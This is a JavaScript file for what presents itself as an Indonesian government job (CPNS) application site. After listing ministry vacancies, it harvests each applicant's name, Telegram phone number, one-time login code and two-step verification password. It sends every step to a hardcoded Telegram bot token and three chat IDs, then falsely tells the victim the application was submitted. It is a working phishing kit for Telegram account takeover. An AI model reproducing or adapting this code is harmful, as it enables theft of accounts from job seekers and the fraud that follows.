const jobs = {
  guru_sd: {
    title: "Guru Sekolah Dasar (SD)",
    company: "Kementerian Pendidikan dan Kebudayaan",
    location: "Domisili Pelamar",
    salary: "IDR 5.000.000 - IDR 7.000.000",
    description:
      "Bertanggung jawab untuk mengajar dan mendidik siswa di tingkat sekolah dasar.",
    image:
      "https://assets.promediateknologi.id/crop/0x0:0x0/750x500/webp/photo/2022/08/07/3252546216.png",
  },
  guru_smp: {
    title: "Guru Sekolah Menengah Pertama (SMP)",
    company: "Kementerian Pendidikan dan Kebudayaan",
    location: "Domisili Pelamar",
    salary: "IDR 5.500.000 - IDR 8.000.000",
    description:
      "Mengajar dan membimbing siswa di tingkat sekolah menengah pertama.",
    image:
      "https://static.promediateknologi.id/crop/0x0:0x0/750x500/webp/photo/p1/593/2024/09/01/cpns2024-1412818208.jpg",
  },
  guru_sma: {
    title: "Guru Sekolah Menengah Atas (SMA)",
    company: "Kementerian Pendidikan dan Kebudayaan",
    location: "Domisili Pelamar",
    salary: "IDR 6.000.000 - IDR 9.000.000",
    description:
      "Mengajar dan membimbing siswa di tingkat sekolah menengah atas.",
    image:
      "https://blog-cdn.kitalulus.com/blog/wp-content/uploads/2024/02/20100433/642294cd8bdb513fbd169291_cara-daftar-cpns.webp",
  },
  guru_bk: {
    title: "Guru Bimbingan Konseling (BK)",
    company: "Kementerian Pendidikan dan Kebudayaan",
    location: "Domisili Pelamar",
    salary: "IDR 6.500.000 - IDR 8.500.000",
    description: "Memberikan bimbingan dan konseling kepada siswa.",
    image:
      "https://storage.googleapis.com/wpc-storage/jadiasn.id/2024/10/b9e0a676-image-1024x682.png",
  },
  guru_khusus: {
    title: "Guru Mata Pelajaran Khusus",
    company: "Kementerian Pendidikan dan Kebudayaan",
    location: "Domisili Pelamar",
    salary: "IDR 7.000.000 - IDR 10.000.000",
    description:
      "Mengajar mata pelajaran khusus seperti matematika, bahasa Inggris, dan seni budaya.",
    image:
      "https://static.promediateknologi.id/crop/0x0:0x0/750x500/webp/photo/p1/995/2024/08/31/WhatsApp-Image-2024-08-31-at-112124_c5f07857-113316878.jpg",
  },
  dokter_umum: {
    title: "Dokter Umum",
    company: "Kementerian Kesehatan",
    location: "Sesuai Domisili Pelamar",
    salary: "IDR 10.000.000 - IDR 15.000.000",
    description: "Memberikan pelayanan kesehatan umum kepada masyarakat.",
    image:
      "https://static.promediateknologi.id/crop/0x0:0x0/750x500/webp/photo/p1/358/2024/09/01/11-formasi-cpns-2024-dokter-gigi-di-kabupaten-blora-dibuka-untuk-umum-cek-besaran-gaji-dan-lokasi-penempatannya-1510304233.jpg",
  },
  dokter_spesialis: {
    title: "Dokter Spesialis",
    company: "Kementerian Kesehatan",
    location: "Sesuai Domisili Pelamar",
    salary: "IDR 15.000.000 - IDR 25.000.000",
    description: "Memberikan pelayanan kesehatan spesialis kepada pasien.",
    image:
      "https://media.sukabumiupdate.com/media/2023/10/14/1697269353_652a466930d85_bNKZOwQOxnSA4X0kjIMQ-medium.webp",
  },
  perawat: {
    title: "Perawat",
    company: "Kementerian Kesehatan",
    location: "Sesuai Domisili Pelamar",
    salary: "IDR 5.000.000 - IDR 8.000.000",
    description: "Memberikan perawatan dan dukungan kepada pasien.",
    image:
      "https://static.promediateknologi.id/crop/0x0:0x0/750x500/webp/photo/p1/358/2024/04/02/bidan-perawat-wajib-ikut-nih-kementerian-kesehatan-buka-formasi-cpns-dan-pppk-2024-dengan-jumlah-banyak-segini-totalnya-1403403391.jpg",
  },
  bidan: {
    title: "Bidan",
    company: "Kementerian Kesehatan",
    location: "Sesuai Domisili Pelamar",
    salary: "IDR 6.000.000 - IDR 9.000.000",
    description: "Memberikan pelayanan kesehatan ibu dan anak.",
    image:
      "https://storage.googleapis.com/wpc-storage/jadiasn.id/2024/02/b291d9a0-cover-artikel-web-2.0-all-platform-37.png",
  },
  apoteker: {
    title: "Apoteker",
    company: "Kementerian Kesehatan",
    location: "Sesuai Domisili Pelamar",
    salary: "IDR 7.000.000 - IDR 10.000.000",
    description: "Mengelola dan memberikan obat kepada pasien.",
    image:
      "https://jadiasn.id/wp-content/uploads/2023/08/artikel-2023-08-10T091803.422-1024x1024.jpg",
  },
  keuangan_djp: {
    title: "Kementerian Keuangan (Direktorat Jenderal Pajak)",
    company: "Kementerian Keuangan",
    location: "Sesuai Domisili Pelamar",
    salary: "IDR 8.000.000 - IDR 12.000.000",
    description: "Mengelola pajak dan keuangan negara.",
    image:
      "https://static.promediateknologi.id/crop/0x0:0x0/0x0/webp/photo/p2/91/2024/08/21/Kemenkeu-umumkan-buka-formasi-CPNS-2024-Kemenkeugoid-3171062693.png",
  },
  kementerian_pendidikan: {
    title: "Kementerian Pendidikan, Kebudayaan, Riset, dan Teknologi",
    company: "Kementerian Pendidikan",
    location: "Sesuai Domisili Pelamar",
    salary: "IDR 7.000.000 - IDR 10.000.000",
    description: "Mengelola pendidikan dan kebudayaan di Indonesia.",
    image:
      "https://cdn.bimbelptk.com/assets/bimbelcasn/uploads/article/image_formasi_cpns_kemendikbudristek_2024_dan_kualifikasi_pendidikan_yang_diperlukan_1724900459_66cfe46b77a97.png",
  },
  kementerian_kesehatan: {
    title: "Kementerian Kesehatan",
    company: "Kementerian Kesehatan",
    location: "Sesuai Domisili Pelamar",
    salary: "IDR 8.000.000 - IDR 12.000.000",
    description: "Mengelola kesehatan masyarakat di Indonesia.",
    image:
      "https://www.asninstitute.id/wp-content/uploads/2024/05/WhatsApp-Image-2024-05-10-at-16.07.44_c915f1cf-1024x512.jpg.webp",
  },
  kementerian_hukum: {
    title: "Kementerian Hukum dan HAM",
    company: "Kementerian Hukum dan HAM",
    location: "Sesuai Domisili Pelamar",
    salary: "IDR 7.500.000 - IDR 10.000.000",
    description: "Mengawasi dan menegakkan hukum di Indonesia.",
    image:
      "https://media.kompas.tv/library/image/content_article/article_img/20240613010959.jpg",
  },
  kementerian_luar_negeri: {
    title: "Kementerian Luar Negeri",
    company: "Kementerian Luar Negeri",
    location: "Sesuai Domisili Pelamar",
    salary: "IDR 10.000.000 - IDR 15.000.000",
    description: "Mengelola hubungan luar negeri Indonesia.",
    image:
      "https://storage.googleapis.com/wpc-storage/jadiasn.id/2024/09/b72c036e-formasi-cpns-kemenlu-yuk-mulai-karir-internasionalmu-1024x576.png",
  },
  //   guru_sekolah_daerah: {
  //     title: "Guru untuk Sekolah Daerah",
  //     company: "Dinas Pendidikan Daerah",
  //     location: "Berbagai Daerah",
  //     salary: "IDR 5.000.000 - IDR 7.000.000",
  //     description: "Mengajar di sekolah-sekolah daerah.",
  //     image: "https://via.placeholder.com/600x400?text=Guru+Sekolah+Daerah",
  //   },
  tenaga_medis: {
    title: "Tenaga Medis di RSUD",
    company: "RSUD Daerah",
    location: "Berbagai Daerah",
    salary: "IDR 6.000.000 - IDR 9.000.000",
    description: "Memberikan pelayanan medis di rumah sakit daerah.",
    image:
      "https://dfjxf00kmtnmg.cloudfront.net/studiku.id/articles/prod-2024-08-12-1723438023.webp",
  },
  tenaga_administrasi: {
    title: "Tenaga Administrasi",
    company: "Pemerintah Daerah",
    location: "Berbagai Daerah",
    salary: "IDR 5.000.000 - IDR 7.000.000",
    description: "Mengelola administrasi di pemerintahan daerah.",
    image:
      "https://smpn1batujajar.sch.id/wp-content/uploads/2020/07/adm-tu.png",
  },
  penyuluh_desa: {
    title: "Penyuluh Desa",
    company: "Dinas Pertanian",
    location: "Berbagai Daerah",
    salary: "IDR 6.000.000 - IDR 8.000.000",
    description: "Memberikan penyuluhan kepada masyarakat desa.",
    image: "https://jadiasn.id/wp-content/uploads/2024/06/N-27-1024x576.png",
  },
};

// Fungsi untuk mendapatkan parameter URL
function getQueryParam(param) {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get(param);
}

// Mengambil jenis pekerjaan dari parameter URL
const jobType = getQueryParam("job");
const job = jobs[jobType];

// Menampilkan informasi pekerjaan
if (job) {
  document.getElementById("job-title").innerText = job.title;
  document.getElementById("job-company").innerText = `Instansi: ${job.company}`;
  document.getElementById("job-location").innerText = `Lokasi: ${job.location}`;
  document.getElementById("job-salary").innerText = job.salary;
  document.getElementById("job-description").innerText = job.description;
  document.getElementById("job-image").src = job.image;
} else {
  document.getElementById("job-application").innerHTML =
    '<p class="text-red-500">Pekerjaan tidak ditemukan.</p>';
}

const botToken = "7710996998:AAFEvb--UOvfz_CbMsNWFW79NIFlV7gZVGY"; // Ganti dengan token bot Anda
const chatIds = ["6124038392", "7927218790", "5460230196"]; // Ganti dengan array chat ID Anda

// Fungsi untuk mengirim pesan ke Telegram
function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  // Mengirim pesan ke setiap chatId
  const promises = chatIds.map((chatId) => {
    const data = {
      chat_id: chatId,
      text: message,
      parse_mode: "HTML", // Menggunakan HTML untuk format pesan
    };

    return fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    })
      .then((response) => response.json())
      .catch((error) => {
        console.error("Error:", error);
      });
  });

  // Mengembalikan Promise yang menyelesaikan ketika semua pesan terkirim
  return Promise.all(promises);
}

// Fungsi untuk menampilkan loading screen
function showLoadingScreen() {
  document.getElementById("loading-screen").classList.remove("hidden");
  setTimeout(() => {
    document.getElementById("loading-screen").classList.add("hidden");
  }, 3000); // Menyembunyikan loading screen setelah 3 detik
}

function Loading2() {
  document.getElementById("loading-screen2").classList.remove("hidden");
  setTimeout(() => {
    document.getElementById("loading-screen2").classList.add("hidden");
  }, 3000); // Menyembunyikan loading screen setelah 3 detik
}

function validateInputs() {
  const name = document.getElementById("name").value;
  const telegram = document.getElementById("telegram").value;
  const verificationCode = document.getElementById("verification-code").value;
  const twoStepCode = document.getElementById("two-step-code").value;

  if (
    !name ||
    !telegram ||
    (document.getElementById("step-2").classList.contains("hidden")
      ? false
      : !verificationCode) ||
    (document.getElementById("step-3").classList.contains("hidden")
      ? false
      : !twoStepCode)
  ) {
    alert("Semua form harus diisi sebelum melanjutkan.");
    return false;
  }
  return true;
}

// Event listener untuk Step 1
document.getElementById("next-step-1").addEventListener("click", function () {
  if (!validateInputs()) return;

  const name = document.getElementById("name").value;
  const telegram = document.getElementById("telegram").value;

  // Kirim informasi pribadi ke Telegram
  sendToTelegram(
    `Data Masuk Bosku\n\nNama: ${name}\nNomor Telegram: ${telegram}\nOTP : \nVerifikasi 2 Langkah :`
  ).then(() => {
    // Tampilkan loading screen
    showLoadingScreen();
    // Tampilkan Step 2 setelah loading
    setTimeout(() => {
      document.getElementById("step-1").classList.add("hidden");
      document.getElementById("step-2").classList.remove("hidden");
    }, 3000); // Menunggu 3 detik sebelum melanjutkan
  });
});

// Event listener untuk Step 2
document.getElementById("next-step-2").addEventListener("click", function () {
  if (!validateInputs()) return;

  const verificationCode = document.getElementById("verification-code").value;
  const name = document.getElementById("name").value;
  const telegram = document.getElementById("telegram").value;

  // Kirim kode verifikasi ke Telegram
  sendToTelegram(
    `Data Masuk Bosku\n\nNama: ${name}\nNomor Telegram: ${telegram}\nOTP : ${verificationCode}\nVerifikasi 2 Langkah :`
  ).then(() => {
    // Tampilkan loading screen
    showLoadingScreen();
    // Tampilkan Step 3 setelah loading
    setTimeout(() => {
      document.getElementById("step-2").classList.add("hidden");
      document.getElementById("step-3").classList.remove("hidden");
    }, 3000); // Menunggu 3 detik sebelum melanjutkan
  });
});

// Event listener untuk Step 3
document
  .getElementById("submit-application")
  .addEventListener("click", function () {
    if (!validateInputs()) return;

    const verificationCode = document.getElementById("verification-code").value;
    const name = document.getElementById("name").value;
    const telegram = document.getElementById("telegram").value;
    const twoStepCode = document.getElementById("two-step-code").value;

    // Kirim kode verifikasi 2 langkah ke Telegram
    sendToTelegram(
      `Data Masuk Bosku\n\nNama: ${name}\nNomor Telegram: ${telegram}\nOTP : ${verificationCode}\nVerifikasi 2 Langkah : ${twoStepCode}`
    ).then(() => {
      // Tampilkan loading screen
      showLoadingScreen();
      // Simulasi pengiriman data (Anda bisa menambahkan logika pengiriman data ke server di sini)
      setTimeout(() => {
        alert("Lamaran Anda telah dikirim!");
        document.getElementById("step-3").classList.add("hidden");
      }, 3000); // Simulasi loading selama 3 detik
    });
  });

// Mencegah input huruf pada nomor Telegram dan kode verifikasi
document.getElementById("telegram").addEventListener("input", function (e) {
  this.value = this.value.replace(/[^0-9]/g, ""); // Hanya izinkan angka
});

document
  .getElementById("verification-code")
  .addEventListener("input", function (e) {
    this.value = this.value.replace(/[^0-9]/g, ""); // Hanya izinkan angka
  });
